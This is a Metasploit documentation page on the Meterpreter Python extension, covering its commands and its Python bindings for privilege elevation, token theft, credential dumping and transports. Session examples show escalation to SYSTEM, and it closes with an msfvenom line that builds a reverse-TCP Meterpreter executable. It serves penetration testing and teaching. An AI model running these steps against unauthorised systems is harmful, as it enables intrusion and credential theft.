href="/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html" class="nav-list-link">2018 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2019-project-ideas.html" class="nav-list-link">2019 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html" class="nav-list-link">2020 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html" class="nav-list-link">2021 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html" class="nav-list-link">2022 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2023-project-ideas.html" class="nav-list-link">2023 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html" class="nav-list-link">How to Apply to GSoC</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/" class="nav-list-link">Maintainers</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/committer-keys.html" class="nav-list-link">Committer Keys</a><li class="nav-list-item active"><a href="/docs/development/maintainers/committer-rights.html" class="nav-list-link">Committer Rights</a><li class="nav-list-item active"><a href="/docs/development/maintainers/downloads-by-version.html" class="nav-list-link">Downloads by Version</a><li class="nav-list-item active"><a href="/docs/development/maintainers/metasploit-hackathons.html" class="nav-list-link">Metasploit Hackathons</a><li class="nav-list-item active"><a href="/docs/development/maintainers/metasploit-loginpalooza.html" class="nav-list-link">Metasploit Loginpalooza</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/process/" class="nav-list-link">Process</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/process/assigning-labels.html" class="nav-list-link">Assigning Labels</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html" class="nav-list-link">Guidelines for Accepting Modules and Enhancements</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html" class="nav-list-link">How to deprecate a Metasploit module</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/landing-pull-requests.html" class="nav-list-link">Landing Pull Requests</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/adding-release-notes-to-prs.html" class="nav-list-link">Release Notes</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/rolling-back-merges.html" class="nav-list-link">Rolling back merges</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/unstable-modules.html" class="nav-list-link">Unstable Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/ruby-gems/" class="nav-list-link">Ruby Gems</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/how-to-add-and-update-gems-in-metasploit-framework.html" class="nav-list-link">Adding and Updating</a><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/merging-metasploit-payload-gem-updates.html" class="nav-list-link">Merging Metasploit Payload Gem Updates</a><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/using-local-gems.html" class="nav-list-link">Using local Gems</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/propsals/" class="nav-list-link">Proposals</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/propsals/bundled-modules-proposal.html" class="nav-list-link">Bundled Modules Proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/java-meterpreter-feature-parity-proposal.html" class="nav-list-link">Java Meterpreter Feature Parity Proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/msf6-feature-proposals.html" class="nav-list-link">MSF6 Feature Proposals</a><li class="nav-list-item active"><a href="/docs/development/propsals/metasploit-url-support-proposal.html" class="nav-list-link">Metasploit URL support proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/payload-rename-justification.html" class="nav-list-link">Payload Rename Justification</a><li class="nav-list-item active"><a href="/docs/development/propsals/uberhandler.html" class="nav-list-link">Uberhandler</a><li class="nav-list-item active"><a href="/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html" class="nav-list-link">Work needed to allow msfdb to use postgresql common</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/quality/" class="nav-list-link">Quality</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/quality/common-metasploit-module-coding-mistakes.html" class="nav-list-link">Common Metasploit Module Coding Mistakes</a><li class="nav-list-item active"><a href="/docs/development/quality/loading-test-modules.html" class="nav-list-link">Loading Test Modules</a><li class="nav-list-item active"><a href="/docs/development/quality/measuring-metasploit-performance.html" class="nav-list-link">Measuring Metasploit Performance</a><li class="nav-list-item active"><a href="/docs/development/quality/msftidy.html" class="nav-list-link">Msftidy</a><li class="nav-list-item active"><a href="/docs/development/quality/style-tips.html" class="nav-list-link">Style Tips</a><li class="nav-list-item active"><a href="/docs/development/quality/using-rubocop.html" class="nav-list-link">Using Rubocop</a><li class="nav-list-item active"><a href="/docs/development/quality/writing-module-documentation.html" class="nav-list-link">Writing Module Documentation</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/roadmap/" class="nav-list-link">Roadmap</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/roadmap/2017-roadmap.html" class="nav-list-link">2017 Roadmap</a><li class="nav-list-item active"><a href="/docs/development/roadmap/2017-roadmap-review.html" class="nav-list-link">2017 Roadmap Review</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-breaking-changes.html" class="nav-list-link">Metasploit Breaking Changes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html" class="nav-list-link">Metasploit Data Service</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-5-release-notes.html" class="nav-list-link">Metasploit Framework 5.0 Release Notes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-6-release-notes.html" class="nav-list-link">Metasploit Framework 6.0 Release Notes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-framework-wish-list.html" class="nav-list-link">Metasploit Framework Wish List</a></ul></ul><li class="nav-list-item active"><a href="/docs/contact.html" class="nav-list-link">Contact</a></ul></nav><footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll.</footer></div><div class="main" id="top"><div id="main-header" class="main-header"><div class="search"><div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search Metasploit Documentation" aria-label="Search Metasploit Documentation" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label></div><div id="search-results" class="search-results"></div></div><link rel="stylesheet" href="/assets/css/main.css"><nav aria-label="Auxiliary" class="aux-nav"><ul class="aux-nav-list"><li class="aux-nav-list-item"> <a href="//github.com/rapid7/metasploit-framework" class="site-button" target="_blank" rel="noopener noreferrer" > Metasploit Framework on GitHub </a></ul></nav></div><div id="main-content-wrap" class="main-content-wrap"><nav aria-label="Breadcrumb" class="breadcrumb-nav"><ol class="breadcrumb-nav-list"><li class="breadcrumb-nav-list-item"> <a href="/docs/using-metasploit/">Using Metasploit</a><li class="breadcrumb-nav-list-item"> <a href="/docs/using-metasploit/advanced/">Advanced</a><li class="breadcrumb-nav-list-item"> <a href="/docs/using-metasploit/advanced/meterpreter/">Meterpreter</a><li class="breadcrumb-nav-list-item"> <span>Python Extension</span></ol></nav><div id="main-content" class="main-content" role="main"><h1 id="introduction"> <a href="#introduction" class="anchor-heading" aria-labelledby="introduction"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Introduction</h1><p>For quite some time, Meterpreter users have wanted the ability to run arbitrary scripts under the context of a session on the target machine. While Railgun gives coders the ability to execute arbitrary Win32 API calls, it doesn’t really give them the ability to script the client in a single-shot.</p><p>Meterpreter now has a new extension that aims to solve this problem by providing a completely in-memory Python interpreter that can load scripts, run ad-hoc python commands, and also provides bindings to Meterpreter itself. The extension comes with many (but not <em>all</em>) of the built-in functionality you would expect to see in a running Python interpreter. This includes the likes of <code class="language-plaintext highlighter-rouge">ctypes</code> for easy automation of Win32-related functions. We’ve even taken steps to make this extension piggy-back onto <code class="language-plaintext highlighter-rouge">metsrv</code>’s copy of the SSL libraries in an effort to reduce the size of the resulting binary.</p><p>This page aims to document the features, show examples of how it can be used, and answer a few common questions that come up.</p><p>Unfortunately, at this point in time the extension only works inside x86 and x64 Meterpreters running on Windows targets. However, there are plans to enable this functionality on other implementations over time.</p><h1 id="usage"> <a href="#usage" class="anchor-heading" aria-labelledby="usage"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Usage</h1><p>As with any other extension that comes with Meterpreter, loading it is very simple:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> use python
+Loading extension python...success.
+</code></pre></div></div><p>Once loaded, the help system shows the commands that come with the extension:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> help
+
+    ... snip ...
+
+Python Commands
+===============
+
+    Command         Description
+    -------         -----------
+    python_execute  Execute a python command string
+    python_import   Import/run a python file or module
+    python_reset    Resets/restarts the Python interpreter
+</code></pre></div></div><p>Each of these commands is discussed in detail below.</p><h2 id="python_execute"> <a href="#python_execute" class="anchor-heading" aria-labelledby="python_execute"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> python_execute</h2><p>The <code class="language-plaintext highlighter-rouge">python_execute</code> command is the simplest of all commands that come with the extension, and provides the means to run single-shot lines of Python code, much in the same way that the normal Python interpreter functions from the command-line when using the <code class="language-plaintext highlighter-rouge">-c</code> switch. The full help for the command is as follows:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute -h
+Usage: python_execute &lt;python code&gt; [-r result var name]
+
+Runs the given python string on the target. If a result is required,
+it should be stored in a python variable, and that variable should
+passed using the -r parameter.
+
+OPTIONS:
+
+    -h        Help banner
+    -r &lt;opt&gt;  Name of the variable containing the result (optional)
+</code></pre></div></div><p>A very simple example of this command is shown below:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "print 'Hi, from Meterpreter!'"
+<span class="zg">[+]</span> Content written to stdout:
+Hi, from Meterpreter!
+</code></pre></div></div><p>Notice that any output that is written to stdout is captured by Meterpreter and returned to Metasploit so that it’s visible to the user. This also happens for anything written to stderr, as shown below:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "x = x + 1"
+<span class="ze">[-]</span> Content written to stderr:
+Traceback (most recent call last):
+  File "&lt;string&gt;", line 1, in &lt;module&gt;
+NameError: name 'x' is not defined
+</code></pre></div></div><p>This handy feature now only allows users to see the output of their scripts, but it also means that any errors are completely visible too.</p><p>A more interesting example can be seen below:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "x = [y for y in range(0, 20) if y % 5 == 0]"
+<span class="zg">[+]</span> Command executed without returning a result
+</code></pre></div></div><p>The command above executes, but nothing was printed to stdout, or to stderr, and hence nothing was captured.</p><p>The good thing is that the Python extension is persistent across calls. This means that after the above command is executed, <code class="language-plaintext highlighter-rouge">x</code> is still present in the interpreter and can be accessed with another call:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "print x"
+<span class="zg">[+]</span> Content written to stdout:
+[0, 5, 10, 15]
+</code></pre></div></div><p>As useful as this is, developers may want to produce post-modules that make use of the data that a Python script has generated. Parsing stdout is not ideal in such a scenario, and hence this command provides the means for individual variables to be extracted directly using the <code class="language-plaintext highlighter-rouge">-r</code> parameter, as described by the help:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "x = [y for y in range(0, 20) if y % 5 == 0]" -r x
+<span class="zg">[+]</span> x = [0, 5, 10, 15]
+</code></pre></div></div><p>Note that this command requires the first parameter to be a string that contains code that needs to be executed. However, this string can be blank, resulting in no code being executed. This means that extraction of content generated in previous calls is still possible without executing more code, or rerunning previous code snippets just to make use of the <code class="language-plaintext highlighter-rouge">-r</code> parameter:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "" -r x
+<span class="zg">[+]</span> x = [0, 5, 10, 15]
+</code></pre></div></div><p>Behind the scenes, the result of the execution is a Ruby hash that contains all content written to stdout and stderr, and the content of the variable chosen using the <code class="language-plaintext highlighter-rouge">-r</code> parameter.</p><p>Sometimes, single-line execution isn’t enough, or is cumbersome. The <code class="language-plaintext highlighter-rouge">python_import</code> command is provided to solve this problem and allow for scripts and modules to be loaded into the target from disk.</p><h2 id="python_import"> <a href="#python_import" class="anchor-heading" aria-labelledby="python_import"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> python_import</h2><p>This command allows for whole modules to be loaded from the attacker’s machine an uploaded to the target interpreter. The full help is shown below:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> python_import -h
+Usage: python_import &lt;-f file path&gt; [-n mod name] [-r result var name]
+
+Loads a python code file or module from disk into memory on the target.
+The module loader requires a path to a folder that contains the module,
+and the folder name will be used as the module name. Only .py files will
+work with modules.
+
+OPTIONS:
+
+    -f &lt;opt&gt;  Path to the file (.py, .pyc), or module directory to import
+    -h        Help banner
+    -n &lt;opt&gt;  Name of the module (optional, for single files only)
+    -r &lt;opt&gt;  Name of the variable containing the result (optional, single files only)
+</code></pre></div></div><p>Importing of module trees is still considered a <em>beta</em> feature, but we encourage you to use it where possible and keep us informed of any issues you may face.</p><p>Consider the following script:</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># $ cat /tmp/drives.py
+</span><span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="n">windll</span>
+
+<span class="k">def</span> <span class="nf">get_drives</span><span class="p">():</span>
+    <span class="n">drives</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">bitmask</span> <span class="o">=</span> <span class="n">windll</span><span class="p">.</span><span class="n">kernel32</span><span class="p">.</span><span class="n">GetLogicalDrives</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">uppercase</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">bitmask</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">drives</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">letter</span><span class="p">)</span>
+        <span class="n">bitmask</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
+
+    <span class="k">return</span> <span class="n">drives</span>
+
+<span class="n">result</span> <span class="o">=</span> <span class="n">get_drives</span><span class="p">()</span>
+<span class="k">print</span> <span class="n">result</span>
+</code></pre></div></div><p>The aim of this is to determine all the local logical drives and put the letters into a list. From there it prints that list to screen. The result of running the script is as follows:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> python_import -f /tmp/drives.py
+<span class="zs">[*]</span> Importing /tmp/drives.py ...
+<span class="zg">[+]</span> Content written to stdout:
+['A', 'C', 'D', 'Z']
+</code></pre></div></div><p>This shows that <code class="language-plaintext highlighter-rouge">ctypes</code> does indeed function correctly!</p><p>This command is also intended to allow for recursive loading of modules from the local attacker file system, however this feature is still not yet ready for prime time and work is still actively being done on this area.</p><h2 id="python_reset"> <a href="#python_reset" class="anchor-heading" aria-labelledby="python_reset"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> python_reset</h2><p>It may get to a point where the content of the interpreter needs to be flushed. The <code class="language-plaintext highlighter-rouge">python_reset</code> command clears out all imports, libraries and global variables:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "x = 100"
+<span class="zg">[+]</span> Command executed without returning a result
+<span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "print x"
+<span class="zg">[+]</span> Content written to stdout:
+100
+
+<span class="zp">meterpreter</span> <span class="p">&gt;</span> python_reset
+<span class="zg">[+]</span> Python interpreter successfully reset
+<span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "print x"
+<span class="ze">[-]</span> Content written to stderr:
+Traceback (most recent call last):
+  File "&lt;string&gt;", line 1, in &lt;module&gt;
+NameError: name 'x' is not defined
+</code></pre></div></div><h2 id="meterpreter-bindings"> <a href="#meterpreter-bindings" class="anchor-heading" aria-labelledby="meterpreter-bindings"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Meterpreter Bindings</h2><p>A number of bindings are available to the Python extension that allow for interaction with the Meterpreter instance itself. They are broken up into logical modules based on the functionality that they provide. Bindings are available for other extensions as well, and hence in order to use them, those extensions must be loaded. If an extension is not present, and error is thrown. As soon as an extension is loaded, the function should work. Each of the following subsections shows a module namespace that must be imported for that module to function correctly.</p><h3 id="binding-list"> <a href="#binding-list" class="anchor-heading" aria-labelledby="binding-list"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Binding list</h3><h4 id="meterpreterelevate"> <a href="#meterpreterelevate" class="anchor-heading" aria-labelledby="meterpreterelevate"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> meterpreter.elevate</h4><ul><li><code class="language-plaintext highlighter-rouge">meterpreter.elevate.getsystem()</code> - maps directly to the <code class="language-plaintext highlighter-rouge">getsystem</code> command, however only attempts to use technique <code class="language-plaintext highlighter-rouge">1</code> because this is the only technique that doesn’t require a binary to be uploaded.<li><code class="language-plaintext highlighter-rouge">meterpreter.elevate.rev2self()</code> - maps directly to the <code class="language-plaintext highlighter-rouge">rev2self</code> command.<li><code class="language-plaintext highlighter-rouge">meterpreter.elevate.steal_token(pid)</code> - provides the ability to steal a token from another process.<ul><li><code class="language-plaintext highlighter-rouge">pid</code> - the identifier of the process to steal the token from.</ul><li><code class="language-plaintext highlighter-rouge">meterpreter.elevate.drop_token()</code> - drops the token that was stolen using <code class="language-plaintext highlighter-rouge">steal_token</code>.</ul><h4 id="meterpreterextapi-requires-the-extapi-extension"> <a href="#meterpreterextapi-requires-the-extapi-extension" class="anchor-heading" aria-labelledby="meterpreterextapi-requires-the-extapi-extension"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> meterpreter.extapi (requires the extapi extension)</h4><p>Each of the following functions takes the following parameters:</p><ul><li><code class="language-plaintext highlighter-rouge">domain_name</code> - the name of the domain that will be enumerated.<li><code class="language-plaintext highlighter-rouge">max_results</code> - maximum number of results (default <code class="language-plaintext highlighter-rouge">None</code>).<li><code class="language-plaintext highlighter-rouge">page_size</code> - the size of the results page (default <code class="language-plaintext highlighter-rouge">None</code>).</ul><p>The full list of available functions is as follows:</p><ul><li><code class="language-plaintext highlighter-rouge">meterpreter.extapi.adsi.enum_dcs(domain_name, max_results, page_size)</code> - enumerate the domain controllers on the given domain.<li><code class="language-plaintext highlighter-rouge">meterpreter.extapi.adsi.enum_users(domain_name, max_results, page_size)</code> - enumerate users on the given domain.<li><code class="language-plaintext highlighter-rouge">meterpreter.extapi.adsi.enum_group_users_nested(domain_name, group_dn, max_results, page_size)</code> - enumerate users in the given group recursively.<ul><li><code class="language-plaintext highlighter-rouge">group_dn</code> - The distinguished name of the group to enumerate.</ul><li><code class="language-plaintext highlighter-rouge">meterpreter.extapi.adsi.enum_computers(domain_name, max_results, page_size)</code> - enumerate computers on the given domain.<li><code class="language-plaintext highlighter-rouge">meterpreter.extapi.adsi.domain_query(domain_name, query_filter, fields, max_results, page_size)</code> - provides a generic query mechanism to ADSI. All other functions in this library make use of this function.<ul><li><code class="language-plaintext highlighter-rouge">query_filter</code> - the LDAP-formatted query filter for the query.<li><code class="language-plaintext highlighter-rouge">fields</code> - list of fields to extract from the query results.</ul></ul><h4 id="meterpreterfs"> <a href="#meterpreterfs" class="anchor-heading" aria-labelledby="meterpreterfs"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> meterpreter.fs</h4><ul><li><code class="language-plaintext highlighter-rouge">meterpreter.fs.show_mount()</code> - maps to the <code class="language-plaintext highlighter-rouge">show_mount</code> command and lists all logical drives on the target.</ul><h4 id="meterpreterincognito-requires-the-incognito-extension"> <a href="#meterpreterincognito-requires-the-incognito-extension" class="anchor-heading" aria-labelledby="meterpreterincognito-requires-the-incognito-extension"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> meterpreter.incognito (requires the incognito extension)</h4><ul><li><code class="language-plaintext highlighter-rouge">meterpreter.incognito.list_user_tokens()</code> - list all available user tokens.<li><code class="language-plaintext highlighter-rouge">meterpreter.incognito.list_group_tokens()</code> - list all available group tokens.<li><code class="language-plaintext highlighter-rouge">meterpreter.incognito.impersonate(user)</code> - impersonate the given user.<ul><li><code class="language-plaintext highlighter-rouge">user</code> - name of the user/group to impersonate in <code class="language-plaintext highlighter-rouge">DOMAIN\user</code> format.</ul><li><code class="language-plaintext highlighter-rouge">meterpreter.incognito.snarf_hashes(server)</code> - run the <code class="language-plaintext highlighter-rouge">snarf_hashes</code> functionality using the specified server.<ul><li><code class="language-plaintext highlighter-rouge">server</code> - name of the server that is in place and ready to snarf the hashes.</ul><li><code class="language-plaintext highlighter-rouge">meterpreter.incognito.add_user(server, username, password)</code> - add a user to the given server.<ul><li><code class="language-plaintext highlighter-rouge">server</code> - name of the server to use when adding the user.<li><code class="language-plaintext highlighter-rouge">username</code> - name of the user to create.<li><code class="language-plaintext highlighter-rouge">password</code> - password for the new user.</ul><li><code class="language-plaintext highlighter-rouge">meterpreter.incognito.add_group_user(server, group, username)</code> - add a user to a group (domain).<ul><li><code class="language-plaintext highlighter-rouge">server</code> - name of the server to use when adding the user to a group.<li><code class="language-plaintext highlighter-rouge">group</code> - name of the group to add the user to.<li><code class="language-plaintext highlighter-rouge">username</code> - name of the user to add to the group.</ul><li><code class="language-plaintext highlighter-rouge">meterpreter.incognito.add_localgroup_user(server, group, username)</code> - add a user to a group (local).<ul><li><code class="language-plaintext highlighter-rouge">server</code> - name of the server to use when adding the user to a group.<li><code class="language-plaintext highlighter-rouge">group</code> - name of the group to add the user to.<li><code class="language-plaintext highlighter-rouge">username</code> - name of the user to add to the group.</ul></ul><h4 id="meterpreterkiwi-requires-the-kiwi-extension"> <a href="#meterpreterkiwi-requires-the-kiwi-extension" class="anchor-heading" aria-labelledby="meterpreterkiwi-requires-the-kiwi-extension"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> meterpreter.kiwi (requires the kiwi extension)</h4><ul><li><code class="language-plaintext highlighter-rouge">meterpreter.kiwi.creds_all()</code> - matches the <code class="language-plaintext highlighter-rouge">creds_all</code> command from the kiwi extension and returns a full list of all credentials that can be pulled from memory.</ul><h4 id="meterpretersys"> <a href="#meterpretersys" class="anchor-heading" aria-labelledby="meterpretersys"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> meterpreter.sys</h4><ul><li><code class="language-plaintext highlighter-rouge">meterpreter.sys.info()</code> - matches the <code class="language-plaintext highlighter-rouge">sysinfo</code> command and shows system information.<li><code class="language-plaintext highlighter-rouge">meterpreter.sys.ps_list()</code> - matches the <code class="language-plaintext highlighter-rouge">ps</code> command and lists the processes on the target.</ul><h4 id="meterpretertransport"> <a href="#meterpretertransport" class="anchor-heading" aria-labelledby="meterpretertransport"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> meterpreter.transport</h4><ul><li><code class="language-plaintext highlighter-rouge">meterpreter.transport.list()</code> - list all transports in the target.<li><code class="language-plaintext highlighter-rouge">meterpreter.transport.add(url, session_expiry, comm_timeout, retry_total, retry_wait, ua, proxy_host, proxy_user, proxy_pass, cert_hash)</code> - allows for transports to be added to the Meterpreter session. All but the <code class="language-plaintext highlighter-rouge">url</code> parameter come with a sane default. Full details of each of these parameters can be found in the <a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html">transport</a> documentation.</ul><p>It is not possible to delete transports using the python extension as this opens the door to many kinds of failure.</p><h4 id="meterpreteruser"> <a href="#meterpreteruser" class="anchor-heading" aria-labelledby="meterpreteruser"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> meterpreter.user</h4><ul><li><code class="language-plaintext highlighter-rouge">meterpreter.user.getuid()</code> - gets the UID of the current session.<li><code class="language-plaintext highlighter-rouge">meterpreter.user.getsid()</code> - gets the SID of the current session.<li><code class="language-plaintext highlighter-rouge">meterpreter.user.is_system()</code> - determines if the current session is running as the <code class="language-plaintext highlighter-rouge">SYSTEM</code> user.</ul><h3 id="bindings-example"> <a href="#bindings-example" class="anchor-heading" aria-labelledby="bindings-example"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bindings example</h3><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">meterpreter</span> <span class="p">&gt;</span> getuid
+Server username: WIN-TV01I7GG7JK\oj
+<span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "import meterpreter.user; print meterpreter.user.getuid()"
+<span class="zg">[+]</span> Content written to stdout:
+WIN-TV01I7GG7JK\oj
+
+<span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "import meterpreter.elevate; meterpreter.elevate.getsystem()"
+<span class="zg">[+]</span> Command executed without returning a result
+<span class="zp">meterpreter</span> <span class="p">&gt;</span> getuid
+Server username: NT AUTHORITY\SYSTEM
+<span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "meterpreter.elevate.rev2self(); print meterpreter.user.getuid()"
+<span class="zg">[+]</span> Content written to stdout:
+WIN-TV01I7GG7JK\oj
+
+<span class="zp">meterpreter</span> <span class="p">&gt;</span> use incognito
+Loading extension incognito...success.
+<span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "import meterpreter.incognito; print meterpreter.incognito.list_user_tokens()"
+<span class="zg">[+]</span> Content written to stdout:
+{'Delegation': ['NT AUTHORITY\\LOCAL SERVICE', 'NT AUTHORITY\\NETWORK SERVICE', 'NT AUTHORITY\\SYSTEM', 'WIN-TV01I7GG7JK\\oj'], 'Impersonation': ['NT AUTHORITY\\ANONYMOUS LOGON']}
+
+<span class="zp">meterpreter</span> <span class="p">&gt;</span> python_execute "import meterpreter.fs; print meterpreter.fs.show_mount()"
+<span class="zg">[+]</span> Content written to stdout:
+[{'Name': 'A:\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 2}, {'Name': 'C:\\', 'SpaceUser': 28950585344L, 'SpaceTotal': 64422408192L, 'UNC': None, 'SpaceFree': 28950585344L, 'Type': 3}, {'Name': 'D:\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 5}]
+</code></pre></div></div><p>Each of the examples above just show the results printed to stdout, however the values are returned as Python dictionaries and can be operated on just like normal variables.</p><h2 id="stageless-initialisation"> <a href="#stageless-initialisation" class="anchor-heading" aria-labelledby="stageless-initialisation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Stageless Initialisation</h2><p>Not only can the extension be baked into a stageless Meterpreter, like any other extension, it also has the ability to run an arbitrary script before the Meterpreter session is even established! Consider the following script:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$  cat /tmp/met.py
+import meterpreter.transport
+meterpreter.transport.add("tcp://127.0.0.1:8000")
+</code></pre></div></div><p>This is a simple script that uses the Meterpreter bindings to add a new transport to the list of transports. This is executed immediately before Meterpreter attempts to create a connection back to Metasploit for the first time. The intent is to show that it’s possible to add any number of transports on startup.</p><p>To create a stageless payload that uses this script, we can make use of the <code class="language-plaintext highlighter-rouge">EXTINIT</code> parameter in <code class="language-plaintext highlighter-rouge">msfvenom</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4445 EXTENSIONS=stdapi,priv,python EXTINIT=python,/tmp/met.py -f exe -o /tmp/met-stageless.exe
